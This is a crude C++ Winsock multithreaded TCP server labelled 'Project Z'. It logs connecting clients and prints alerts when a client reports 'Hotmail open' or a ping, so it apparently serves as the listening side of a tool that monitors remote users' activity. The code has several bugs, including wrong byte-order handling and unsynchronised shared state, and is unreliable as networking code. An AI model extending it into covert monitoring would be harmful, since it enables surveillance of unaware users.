//Winsock server with multi-client (multithreaded) handling.

//getting head
#include <winsock2.h>
#include <windns.h>
#include <iostream>
#include <process.h>
#include <stdio.h>
#include <string>


using namespace std;

//-----Prototypes and global vars
unsigned int __stdcall ServClient(void*data);
WSADATA wsaData;
int iResult; //Validity switch
sockaddr_in addr;
SOCKET sock,client;
SOCKADDR_IN client_info = {0}; //To get Client ip
int addrsize = sizeof(client_info); //To get ip
struct hostent *he; //Stupid addr struct to hold our resolved IP
struct in_addr **addr_list; //Stupid addr struct to hold our resolved IP
int i;  // Placmarker for struct
string hostname;
int PORT;
unsigned short int connection_counter = 0;
//--------------------------------


// =======================================================================BEGIN!!!!======================================================
int main(int argc, _TCHAR* argv[]){

//________WSA Prep
addr.sin_family = AF_INET;
iResult = WSAStartup(MAKEWORD(2,2),&wsaData);
//_______

printf("______________Project Z alpha 0.1.9____________\n");






//____WSA Init check
if(iResult){

        printf("[X]WSA Startup failure..");
        return 0;
            }
 ///____________



// ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~IP Resolveer , HOLY SHIT THIS IS MESSY BUT IT WORKS!!!!! ~~~~~~~~~~~~~~~~~~~~~~
START:


 printf("\n-[Listen on (DNS/IP)]: ");
cin >> hostname;
 printf("[i]Checking host: %s ......\n", hostname.c_str());
he = gethostbyname(hostname.c_str()); //convert string to char array and look it up
if (!he)
  { puts("[i]Host could not be resolved..");
    goto START; //try again
  }else{
  addr_list = (struct in_addr **)he->h_addr_list;

  for(i = 0; addr_list[i] != NULL; i++) { //cycle thru possible hosts
         printf("[i]Host Found:%s ", inet_ntoa(*addr_list[i]));
         //addr.sin_addr.S_un.S_addr = inet_addr("127.0.0.1");
        addr.sin_addr.S_un.S_addr = htonl(inet_addr(inet_ntoa(*addr_list[i]))); //SET OUR FUCKING IP TO RESOLVED DNS !
         break;
    }
  }

/// ~~~~~~~~~~~~~~~~~~ DNS DONE ~~~~~~~~~~~~~~~




//__________Set Port_________

      printf("\n-[Listen on (PORT)]: ");
    cin >> PORT;
    addr.sin_port = htons(PORT);


 //  _________ Socket creation and check.   _________
sock = socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
if(sock == INVALID_SOCKET){
        printf("[X]Invalid Socket..\n");
        return 0;

                        }


//_____Bind +check on the ip and port so we can start to listen. If we get an error here the port or IP pay already be bided elsewhere_____
iResult = bind(sock,(sockaddr*)&addr,sizeof(sockaddr_in)); //bind throws 1 if error
if( iResult ){
    printf("[X]Bind failed...Already binded on port? Correct DNS?\n");
     goto START; //try again
}
///_______________


//_______BEGIN LISTENING + CHECK _____
iResult = listen(sock,SOMAXCONN); //Throws 1 if invalid like bind
if(iResult){
    printf("[X]Failed to listen..\n");
      goto START; //try again
}
//____________

   printf("[i]Listening on %s on port %d\n" ,inet_ntoa(*addr_list[i]),PORT);

//_________________HANDLE CONNECTIONS__________
//This is the loop that keeps the program alive
while(1){

while(client= accept(sock,0,0)) //There is a break in execution here
{
    if(client == INVALID_SOCKET)
    {
        //Dirty cunt , get out
        printf("[X]Client rejected , bad socket..\n");
        continue;
    }
    _beginthreadex(0,0,ServClient,(void*)&client,0,0); //Begin a new thread of execution passing in client socket and using servclient func, then go back to break to wait for more clients
}
}
//_____________________

return 0;

} //master main brace

//-------------------Declare ServClient , our smart ass multi thread handler-------------
unsigned int __stdcall ServClient(void*data){

 connection_counter++; //+1 to the client counter
 char databuffer[200]; //Data buffer to get from this particular client

 //__Convert void socket data to socket data
 SOCKET* pclient = (SOCKET*)data; //Assign our generic pointer data(casted to a sock pointer ) from func into a socket pointer
SOCKET Client = *pclient; //Derefrence into usable data
//__

 //___Get IP
getpeername(Client, (sockaddr*)&client_info, &addrsize);
char *ip = inet_ntoa(client_info.sin_addr);
//____

 printf("[*]Client Connected: %s\n",ip);
 printf("[i] %d clients connected.\n",connection_counter);

//____________MAIN RECEIVE LOOP
 while(recv(Client,databuffer,200,0) != SOCKET_ERROR){ //While the client is still connected
    if(*databuffer == '0') printf("[!]Hotmail open on  \t ID:%d \t  IP:%s\n\n" , GetCurrentThreadId(),ip); //Window open command 0 received
    if(*databuffer == '*') printf("[i]Ping from \t ID:%d \t  IP:%s\n" , GetCurrentThreadId(),ip); //Ping command * received
     //


                                }
//____________MAIN RECEIVE LOOP END


 printf("[!]Client %d disconnected!\n" , GetCurrentThreadId());
 closesocket(Client);
 connection_counter--; //Update connected counter
  printf("[i] %d clients connected.\n",connection_counter);

return 0;


}

